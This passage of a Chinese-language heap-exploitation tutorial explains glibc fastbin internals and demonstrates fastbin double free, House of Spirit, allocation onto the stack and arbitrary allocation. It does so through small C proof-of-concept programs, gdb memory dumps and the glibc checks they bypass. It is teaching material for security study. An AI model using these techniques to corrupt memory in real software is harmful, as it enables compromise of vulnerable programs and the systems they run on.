\u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x30); chunk2=malloc(0x30); chunk3=malloc(0x30); //\u8fdb\u884c\u91ca\u653e free(chunk1); free(chunk2); free(chunk3); return 0; } \u91ca\u653e\u524d 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000000000 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000602000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000602040 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080] ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9 Fastbin Double Free \u00b6 \u4ecb\u7ecd \u00b6 Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002 Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0 fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002 /* Another simple check: make sure the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } \u6f14\u793a \u00b6 \u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk1); return 0; } \u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a] /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c] ./tst[0x4005a2] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830] ./tst[0x400499] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 02200000-02221000 rw-p 00000000 00:00 0 [heap] 7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0 [stack] 7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0 [vvar] 7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk2); free(chunk1); return 0; } \u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1) \u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2) \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1) \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002 \u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena=>chunk1=>chun2=>chunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; CHUNK bss_chunk; int main(void) { void *chunk1,*chunk2,*chunk3; void *chunk_a,*chunk_b; bss_chunk.size=0x21; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk2); free(chunk1); chunk_a=malloc(0x10); *(long long *)chunk_a=&bss_chunk; malloc(0x10); malloc(0x10); chunk_b=malloc(0x10); printf(\"%p\",chunk_b); return 0; } \u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x601080 <bss_chunk>: 0x0000000000000000 0x0000000000000021 0x601090 <bss_chunk+16>:0x0000000000000000 0x0000000000000000 0x6010a0: 0x0000000000000000 0x0000000000000000 0x6010b0: 0x0000000000000000 0x0000000000000000 0x6010c0: 0x0000000000000000 0x0000000000000000 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5] /lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184] ./tst[0x400636] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830] ./tst[0x4004e9] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00600000-00601000 r--p 00000000 08:01 1052570 /home/Ox9A82/tst/tst 00601000-00602000 rw-p 00001000 08:01 1052570 /home/Ox9A82/tst/tst 00bc4000-00be5000 rw-p 00000000 00:00 0 [heap] 7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688 /lib/x86_64-linux-gnu/libc-2.23.so 7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367 /lib/x86_64-linux-gnu/ld-2.23.so 7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0 [stack] 7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0 [vvar] 7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] \u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) _int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim)); return NULL; } \u5c0f\u603b\u7ed3 \u00b6 \u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002 \u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002 House Of Spirit \u00b6 \u4ecb\u7ecd \u00b6 House of Spirit \u662f the Malloc Maleficarum \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d \u6307\u5b9a\u5730\u5740 \u7684 chunk \u7684\u76ee\u7684\u3002 \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373 fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002 fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002 fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e 2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av->system_mem \u3002 fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002 \u6f14\u793a \u00b6 \u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates the house of spirit attack. \\n \" ); fprintf ( stderr , \"Calling malloc() once so that it sets up its memory. \\n \" ); malloc ( 1 ); fprintf ( stderr , \"We will now overwrite a pointer to point to a fake 'fastbin' region. \\n \" ); unsigned long long * a ; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks [ 10 ] __attribute__ (( aligned ( 16 ))); fprintf ( stderr , \"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n \" , sizeof ( fake_chunks ), & fake_chunks [ 1 ], & fake_chunks [ 7 ]); fprintf ( stderr , \"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n \" ); fprintf ( stderr , \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n \" ); fake_chunks [ 1 ] = 0x40 ; // this is the size fprintf ( stderr , \"The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n \" ); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks [ 9 ] = 0x1234 ; // nextsize fprintf ( stderr , \"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n \" , & fake_chunks [ 1 ]); fprintf ( stderr , \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n \" ); a = & fake_chunks [ 2 ]; fprintf ( stderr , \"Freeing the overwritten pointer. \\n \" ); free ( a ); fprintf ( stderr , \"Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n \" , & fake_chunks [ 1 ], & fake_chunks [ 2 ]); fprintf ( stderr , \"malloc(0x30): %p \\n \" , malloc ( 0x30 )); } \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b \u279c how2heap git: ( master ) ./house_of_spirit This file demonstrates the house of spirit attack. Calling malloc () once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region ( memory of length: 80 ) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88. This chunk.size of this region has to be 16 more than the region ( to accomodate the chunk data ) while still falling into the fastbin category ( < = 128 on x64 ) . The PREV_INUSE ( lsb ) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED ( second lsb ) and NON_MAIN_ARENA ( third lsb ) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is > 2 *SIZE_SZ ( > 16 on x64 ) && < av->system_mem ( < 128kb by default for the main arena ) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58. ... note that the memory address of the *region* associated with this chunk must be 16 -byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60! malloc ( 0x30 ) : 0x7ffd9bceaa60 \u5c0f\u603b\u7ed3 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002 Alloc to Stack \u00b6 \u4ecb\u7ecd \u00b6 \u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002 \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002 \u6f14\u793a \u00b6 \u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk { long long pre_size; long long size; long long fd; long long bk; } CHUNK,*PCHUNK; int main(void) { CHUNK stack_chunk; void *chunk1; void *chunk_a; stack_chunk.size=0x21; chunk1=malloc(0x10); free(chunk1); *(long long *)chunk1=&stack_chunk; malloc(0x10); chunk_a=malloc(0x10); return 0; } \u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x00007fffffffde60 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <=== top chunk \u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20 <main_arena>: 0x0000000000000000 <=== unsorted bin 0x7ffff7dd1b28 <main_arena+8>: 0x00007fffffffde60 <=== fastbin[0] 0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000 \u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk 0x400629 <main+83> call 0x4004c0 <malloc@plt> \u2192 0x40062e <main+88> mov QWORD PTR [rbp-0x38], rax $rax : 0x00007fffffffde70 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] \u5c0f\u603b\u7ed3 \u00b6 \u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002 Arbitrary Alloc \u00b6 \u4ecb\u7ecd \u00b6 Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002 